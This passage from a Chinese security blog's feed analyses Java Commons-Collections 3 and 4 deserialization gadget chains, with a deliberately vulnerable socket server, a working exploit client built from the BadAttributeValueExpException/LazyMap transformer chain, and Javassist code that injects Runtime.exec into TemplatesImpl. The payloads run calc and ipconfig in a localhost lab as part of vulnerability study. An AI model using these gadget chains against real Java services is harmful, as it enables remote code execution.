Object[]&#123;"summer"&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getConstructor"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;Class[]<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new Object[]&#123;new Class[]&#123;String.class&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"newInstance"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;Object[]<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new Object[]&#123;new String[]&#123;"ipconfig"&#125;&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>&emsp;&emsp; 笔者这里总结都是以CC链为改造基础，其实CC还有很多玩法，大家可以脑洞一下，Java反序列化回显也不止本文中两种，比例说RMI、weblogic的T3协议。学习无止境，努力就完事。</p><p><code>于无常处知有情，于有情处知众生..........</code></p><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://javasec.org/javase/ClassLoader/" target="_blank" rel="noopener">https://javasec.org/javase/ClassLoader/</a><br><a href="https://xz.aliyun.com/t/7740" target="_blank" rel="noopener">https://xz.aliyun.com/t/7740</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;题外话&quot;&gt;&lt;a href=&quot;#题外话&quot; class=&quot;headerlink&quot; title=&quot;题外话&quot;&gt;&lt;/a&gt;题外话&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp; 这是一篇本应该早就完成的文章，但是由于各种原因拖延至此。之前有读者就催我，但是实在是各种事情缠身，加上自己
      
    
    </summary>
    
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Java 反序列化" scheme="http://yoursite.com/tags/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>漫谈Commons-Collections反序列化</title>
    <link href="http://yoursite.com/2020/05/26/%E6%BC%AB%E8%B0%88Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://yoursite.com/2020/05/26/%E6%BC%AB%E8%B0%88Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2020-05-26T13:27:45.000Z</published>
    <updated>2020-05-20T08:19:17.580Z</updated>
    
    <content type="html"><![CDATA[<p>﻿# 前言</p><p>&emsp;&emsp; 如果你没有反序列化的基础，建议你看笔者博客文章先将基础学习一下。如果你没有学习分析过<code>ysoserial--Gadget--URLDNS</code>，建议你看笔者之前发过的文章学习一下。如果你是大佬，前面当笔者没说。<br>&emsp;&emsp; Java的第一个反序列化漏洞就是从<code>commons-collections</code>组件中发现的，从此打开了Java安全的新蓝图。<br>官方对<code>commons-collections</code>组件的说明：<code>The Java Collections Framework was a major addition in JDK 1.2. It added many powerful data structures that accelerate development of most significant Java applications. Since that time it has become the recognised standard for collection handling in Java.</code><br>翻译一下大概意思就是：<code>Java commons-collections 框架是JDK 1.2之后中的一个重要补充。增加了许多强大的数据结构，加快了Java应用程序的开发。已经成为Java中公认的集合处理标准。</code><br>&emsp;&emsp; 目前<code>commons-collections</code>的反序列化漏洞主要以3和4(版本)为主流，3和4的利用方式也不同，Gadget链也不相同。</p><p>PS: 为避免代码太长而导致的阅读效果，故将完整的实验代码全部已经上传至 <a href="https://github.com/SummerSec/JavaLearnVulnerability" target="_blank" rel="noopener">https://github.com/SummerSec/JavaLearnVulnerability</a></p><hr><h1 id="Commons-Collections3"><a href="#Commons-Collections3" class="headerlink" title="Commons-Collections3"></a>Commons-Collections3</h1><p>&emsp;&emsp; 先看一下Gadget链，入口是上篇文章提及的。这里的3是指版本号，笔者这里只分析网上流传的某一条利用链。<code>BadAttributeValueExpException.readObject()</code>类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">       ObjectInputStream.readObject()</span><br><span class="line">           BadAttributeValueExpException.readObject()</span><br><span class="line">               TiedMapEntry.toString()</span><br><span class="line">                   LazyMap.get()</span><br><span class="line">                       ChainedTransformer.transform()</span><br><span class="line">                           ConstantTransformer.transform()</span><br><span class="line">                           InvokerTransformer.transform()</span><br><span class="line">                               Method.invoke()</span><br><span class="line">                                   Class.getMethod()</span><br><span class="line">                           InvokerTransformer.transform()</span><br><span class="line">                               Method.invoke()</span><br><span class="line">                                   Runtime.getRuntime()</span><br><span class="line">                           InvokerTransformer.transform()</span><br><span class="line">                               Method.invoke()</span><br><span class="line">                                   Runtime.exec()</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 试想一下先存在一个服务器，它正好存在使用<code>commons-collections</code>组件，没有做任何的修复，存在漏洞。此时你是不是就能利用此漏洞呢？</p><hr><h2 id="模拟场景DEMO"><a href="#模拟场景DEMO" class="headerlink" title="模拟场景DEMO"></a><strong>模拟场景DEMO</strong></h2><h3 id="创建模拟服务器应用"><a href="#创建模拟服务器应用" class="headerlink" title="创建模拟服务器应用"></a>创建模拟服务器应用</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 模拟服务器端，接受反序列化数据</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ServerSocket serverSocket = <span class="keyword">new</span> ServerSocket(<span class="number">6666</span>);</span><br><span class="line">            System.out.println(<span class="string">"服务器监听地址： "</span> + serverSocket.getLocalSocketAddress());</span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">                <span class="comment">// 接受反序列化数据</span></span><br><span class="line"></span><br><span class="line">                Socket socket = serverSocket.accept();</span><br><span class="line">                System.out.println(<span class="string">"与地址： "</span> + socket.getInetAddress() + <span class="string">"连接！"</span> );</span><br><span class="line">                ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(socket.getInputStream());</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 读取数据</span></span><br><span class="line">                    Object ob = ois.readObject();</span><br><span class="line">                    System.out.println(<span class="string">"读取数据完成！"</span>);</span><br><span class="line">                    System.out.println(ob);</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                    System.out.println(<span class="string">"读取数据失败！"</span>);</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用代码"><a href="#利用代码" class="headerlink" title="利用代码"></a>利用代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">user</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//目的服务器地址</span></span><br><span class="line">        String tas = <span class="string">"127.0.0.1"</span>;</span><br><span class="line">        <span class="comment">// 端口</span></span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">6666</span>;</span><br><span class="line">        <span class="comment">// payload</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;</span><br><span class="line">                ,<span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;</span><br><span class="line">                ,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"calc"&#125;),</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="string">"66666!"</span>)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建漏洞map Object</span></span><br><span class="line">        Map inmap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazymap = LazyMap.decorate(inmap,transformerChain);</span><br><span class="line">        TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazymap,<span class="string">"hack by Summer"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建异常，在反序列化时触发payload</span></span><br><span class="line">        BadAttributeValueExpException expException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Field field = expException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            field.set(expException, entry);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 发送payload</span></span><br><span class="line">        Socket socket = <span class="keyword">new</span> Socket(tas,port);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(socket.getOutputStream());</span><br><span class="line">        oos.writeObject(expException);</span><br><span class="line">        oos.flush();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞效果"><a href="#漏洞效果" class="headerlink" title="漏洞效果"></a>漏洞效果</h3><p>首先得让模拟服务器在运行，然后发送payload即可。<br><img src="https://img-blog.csdnimg.cn/20200517150503233.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200517150434644.gif" alt="在这里插入图片描述"></p><hr><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>&emsp;&emsp; 分析必定要先断点，这里笔者将代码修改了，便于分析。这里就不再贴出，需要的可以去<a href="https://github.com/SummerSec/JavaLearnVulnerability/blob/master/vuldemo/src/main/java/vul/ccbug/cc5.java" target="_blank" rel="noopener">GitHub</a>上自取，断点直接设置在<code>readObject</code>方法。<br><code>温馨提示</code>：如果你用的是Idea工具，在Debug之前请查看自己Debugger设置，请和我一样设置。为什么要这么做可以参考：<a href="https://samny.blog.csdn.net/article/details/105937958" target="_blank" rel="noopener">Skipped breakpoint because it happened inside debugger evaluation</a> ，否则你可能出现很多bug。<br><img src="https://img-blog.csdnimg.cn/20200517155502933.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200517151930246.png" alt="在这里插入图片描述"></p><hr><h4 id="漏洞触发流程"><a href="#漏洞触发流程" class="headerlink" title="漏洞触发流程"></a>漏洞触发流程</h4><ol><li>一直跟进，到<code>BadAttributeValueException.java</code>的<code>readObject</code>方法。</li></ol><p><img src="https://img-blog.csdnimg.cn/20200517163343981.png" alt="在这里插入图片描述"><br>2. toString方法会跳转到<code>TiedMapEntry</code>的toString方法<br><img src="https://img-blog.csdnimg.cn/20200517163803421.png" alt="在这里插入图片描述"><br>3. 跟进getValue()方法<br><img src="https://img-blog.csdnimg.cn/20200517165203612.png" alt="在这里插入图片描述"><br>4. 跟进到get()方法，在get方法中，会判断<code>key</code>是否存在。然后跳转到<code>transform(key)</code>，这里的key是随便填写的，主要是transform方法是被修改过的，里面有恶意payload。<br><img src="https://img-blog.csdnimg.cn/20200517165322855.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20200517165354634.png" alt="在这里插入图片描述"><br>5. 这里是用Java的反射机制，建议去了解一下。推荐博文<a href="https://blog.csdn.net/sun1318578251/category_9977685.html" target="_blank" rel="noopener">从安全角度谈Java反射机制</a><br><img src="https://img-blog.csdnimg.cn/20200517173626405.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200517164317458.png" alt="在这里插入图片描述"></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9ibG9nLXN0YXRpYy5jbmJsb2dzLmNvbS9maWxlcy9zYW1ueS9zZXJpYWxpemFibGUzLmdpZg" alt="https://blog-static.cnblogs.com/files/samny/serializable3.gif"><br>&emsp;&emsp; 看完整个完整的过程，每一步都对应着文章开头的Gadget chain。创建异常类<code>BadAttributeValueExpException</code>，以便于在反序列化时触发payload。<br><img src="https://img-blog.csdnimg.cn/2020051814514391.png" alt="在这里插入图片描述"></p><hr><h4 id="漏洞成因分析"><a href="#漏洞成因分析" class="headerlink" title="漏洞成因分析"></a>漏洞成因分析</h4><p>&emsp;&emsp; 过程看完了，但是我们还是无法理解为什么可以这么构造，还是得一步步看POC源码。我们一一对着官方文档分析函数方法的具体作用。</p><ol><li>ChainedTransformer将一个个Transformer类数组按照顺序一个个执行，前一个运行结果作为第二个transform。<br><img src="https://img-blog.csdnimg.cn/20200517173011310.png" alt="在这里插入图片描述"></li><li>ConstantTransformer调用transform方法，返回类在实例化时存储的类。<br><img src="https://img-blog.csdnimg.cn/20200517173510549.png" alt="在这里插入图片描述"></li><li>InvokerTransformer调用transform方法的时候，根据类在实例化时提供的参数，通过反射去调用对象的方法。InvokerTransformer第一个参数是方法名，第二个参数是参数类型，第三个参数是参数值。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(java.lang.String methodName,</span></span></span><br><span class="line"><span class="function"><span class="params">                          java.lang.Class[] paramTypes,</span></span></span><br><span class="line"><span class="function"><span class="params">                          java.lang.Object[] args)</span></span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200517175953505.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 这是一段反射执行命令的代码，这段执行的效果完全等效于transformers[]数组，下面两张图片可以完美的诠释。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class cls = Class.forName(<span class="string">"java.lang.Runtime"</span>);</span><br><span class="line">           <span class="comment">//实例化对象</span></span><br><span class="line">          Object ob = cls.getMethod(<span class="string">"getRuntime"</span>,<span class="keyword">null</span>).invoke(<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">           <span class="comment">// 反射调用执行命令</span></span><br><span class="line">           cls.getMethod("exec", String.class).invoke(ob,"calc");</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200517164708950.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20200517175632226.png" alt="在这里插入图片描述"></p><hr><p>&emsp;&emsp; 创建一个HashMap，使用LazyMap.decorate()方法传入HashMap和Transformer数组。其中数组是我们构造的payload，最后使用TiedMapEntry传入一个key。其实也可以这样子<code>lazymap.get(&quot;Summer&quot;)</code>也可以传入key，这样子会在序列化过程就将key写入，而在反序列化的时候不会调用<code>LazyMap.get()</code>方法，判断key是否存在。不存在则会调用<code>this.factory.transform(key);</code>方法，进而触发反序列化漏洞。所以很显然这种方法不可取，只能通过修改底层的方式，加入key值，以便于在反序列化的时候触发漏洞，并同时确保在序列化的过程不会触发漏洞。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Map inmap = <span class="keyword">new</span> HashMap();</span><br><span class="line">      Map lazymap = LazyMap.decorate(inmap,transformerChain);</span><br><span class="line">      TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazymap,<span class="string">"hack by Summer"</span>);</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200518095025914.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 到目前为止，并没有触发反序列化漏洞的入口。而<code>BadAttributeValueExpException</code>这个类是javax.management报下的一个类，是jdk自带的，无需依赖第三方。它继承了Serializable接口满足反序列化漏洞的条件，它只有一个值权限是private不可修改，但利用反射机制修改其值来到达触发反序列化漏洞的目的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException expException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           Field field = expException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">           field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">           field.set(expException, entry);</span><br><span class="line"></span><br><span class="line">       &#125; <span class="keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><hr><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>&emsp;&emsp; 反序列化利用点是使用<code>LazyMap</code>在获取key值的时候，使其key不存在，然后再获取key的时候触发漏洞。但需要有一个入口，这里的反序列化触发的入口是JDK自带的<code>BadAttributeValueExpException</code>类。有几个点不得不服大佬们的厉害之处，第一点是找到反序列化的入口<code>BadAttributeValueExpException</code>，这个类得满足反序列化的基本条件，还得是JDK自带或者是组件自带的。第二点是使用<code>LazyMap</code>的key为空来触发反序列化漏洞。<br><img src="https://img-blog.csdnimg.cn/20200518105354743.png" alt="在这里插入图片描述"></p><hr><h1 id="Commons-Collections4"><a href="#Commons-Collections4" class="headerlink" title="Commons-Collections4"></a>Commons-Collections4</h1><p> 先看一下Gadget链，入口是JDK自带的<code>PriorityQueue.readObject()</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    ObjectInputStream.readObject()</span><br><span class="line">        PriorityQueue.readObject()</span><br><span class="line">            ...</span><br><span class="line">                TransformingComparator.compare()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            TemplatesImpl.newTransformer()</span><br><span class="line">                                TemplatesImpl.getTransletInstance()</span><br><span class="line">                                    TemplatesImpl.defineTransletClasses()</span><br><span class="line">                                        Runtime.exec()</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 断点撸码，断点的位置对于新手可能有点不知道该从何下手，其实掌握一点，看入口，反序列化的入口。<code>Commons-Collections4</code>这里的入口时<code>PriorityQueue.readObject()</code>方法，这时你可以双击<code>Shift</code>，找到该类在readObject下断点。<br><img src="https://img-blog.csdnimg.cn/20200518164944907.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 去掉注释，也就省这么几行代码。自己结合官方文档分析一下就知道该断在哪里，如果你在知道具体步骤，你可以将每一行都设置个断点进行分析。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        s.readInt();</span><br><span class="line">        queue = <span class="keyword">new</span> Object[size];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">            queue[i] = s.readObject();</span><br><span class="line">        heapify();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="漏洞触发流程-1"><a href="#漏洞触发流程-1" class="headerlink" title="漏洞触发流程"></a>漏洞触发流程</h3><ol><li>从ObjectInputStream.readObject()-&gt;PriorityQueue.readObject()-&gt;heapify()方法<br><img src="https://img-blog.csdnimg.cn/2020051816535565.png" alt="在这里插入图片描述"></li><li>接着会执行heapify()-&gt;sifrDown()<br><img src="https://img-blog.csdnimg.cn/20200518165629497.png" alt="在这里插入图片描述"></li><li>sifrDown()-&gt;comparator不为空进入siftDownUsingComparator()方法<br><img src="https://img-blog.csdnimg.cn/2020051816581125.png" alt="在这里插入图片描述"></li><li>if判断是否&lt;=0是触发漏洞<br><img src="https://img-blog.csdnimg.cn/20200518165904692.png" alt="在这里插入图片描述"></li><li>compare方法会执行transformer的transform方法，而transform通过反射机制被修改过，最后会导致反序列化漏洞。<br><img src="https://img-blog.csdnimg.cn/20200518170453617.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200519095242678.png" alt="在这里插入图片描述"></li></ol><hr><h3 id="漏洞成因分析-1"><a href="#漏洞成因分析-1" class="headerlink" title="漏洞成因分析"></a>漏洞成因分析</h3><p><a href="https://github.com/SummerSec/JavaLearnVulnerability/blob/master/vuldemo/src/main/java/vul/ccbug/CC4_1.java" target="_blank" rel="noopener">完整的实验代码地址https://github.com/SummerSec/JavaLearnVulnerability/blob/master/vuldemo/src/main/java/vul/ccbug/CC4_1.java</a><br>&emsp;&emsp; Javaassist被广泛用于修改字节码的工具包，而此gadget chain中使用修改字节码的形式触发漏洞。一个 CtClass (编译时类）对象可以处理一个 class 文件，ClassPool 是 CtClass 对象的容器。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取默认系统类搜索路径</span></span><br><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line"><span class="comment">// 添加额外的类搜索路径</span></span><br><span class="line">      pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(Payload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">      pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(abstTranslet));</span><br><span class="line">      <span class="comment">// 获取我们恶意payload的对象</span></span><br><span class="line">      <span class="keyword">final</span> CtClass clazz = pool.get(Payload<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 修改好字节码后，在通过一系列的反射方法，将构造好的字节加入<code>tamplates</code>中，在反序列化的过程触发漏洞。反射这里就不过多的解释，如果不懂可以看笔者往期的博文。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">      <span class="comment">// 静态初始化时插入执行命令的字节码</span></span><br><span class="line">      String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span>;</span><br><span class="line">      clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line"><span class="comment">// 将初始化后的类设置新的名字</span></span><br><span class="line">      clazz.setName(<span class="string">"Summer"</span> + System.nanoTime());</span><br><span class="line">      <span class="comment">// 设置父类为AbstractTranslet</span></span><br><span class="line">      CtClass superC = pool.get(abstTranslet.getName());</span><br><span class="line">      clazz.setSuperclass(superC);</span><br><span class="line"><span class="comment">// 获取修改后的字节码</span></span><br><span class="line">      <span class="keyword">final</span> <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 其实将第二个占位只要是Object的类型对象就可以，比例可以是<code>tpl.newInstace()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这里queue要占两个位，比较方法是要两个才能比较</span></span><br><span class="line">      <span class="comment">// 两个位的都要是一个类型，这里都是Object</span></span><br><span class="line">      queue.add(templates);</span><br><span class="line">      queue.add(<span class="keyword">new</span> VerifyError(<span class="string">"Summer"</span>));</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;修改字节码之后我们再看看<code>newTransformer()</code>–&gt;<code>TemplatesImpl.getTransletInstance()</code> 方法。<br><img src="https://img-blog.csdnimg.cn/20200520141806664.png" alt="在这里插入图片描述"><br>&emsp;&emsp; <code>getTransletInstance()</code>–&gt;<code>defineTransletClasses()</code>，这里会返回一个定义主类的类对象的引用。<br><img src="https://img-blog.csdnimg.cn/20200520142312443.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 最后在这里的强制类型转化触发漏洞，到达执行命令的效果。<br><img src="https://img-blog.csdnimg.cn/20200520142424728.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200520142558464.gif" alt="在这里插入图片描述"></p><hr><h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><p>&emsp;&emsp; <code>PriorityQueue</code>原本只是个优先队列，<code>TemplatesImpl</code>原本只是在xalan中的处理xml的模板实现，但是经过大佬之手二者结合产生巨大效果。吾不敢不服，下面只想用一图展现笔者对此gadget的思考。<br><img src="https://img-blog.csdnimg.cn/20200520144825335.png" alt="在这里插入图片描述"></p><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>&emsp;&emsp; 看完其实不难发现，Java反序列化漏洞必然离不开Java的反射机制的作用。这种都是底层的Java语言的开发者所想到便于开发的机制，下图是oracle官方给出的图例，笔者觉得如果想要打开一个新方向必然会用到一种“新”机制，这种机制应该还是开发人员经常使用的。<br><img src="https://img-blog.csdnimg.cn/20200520151819350.png" 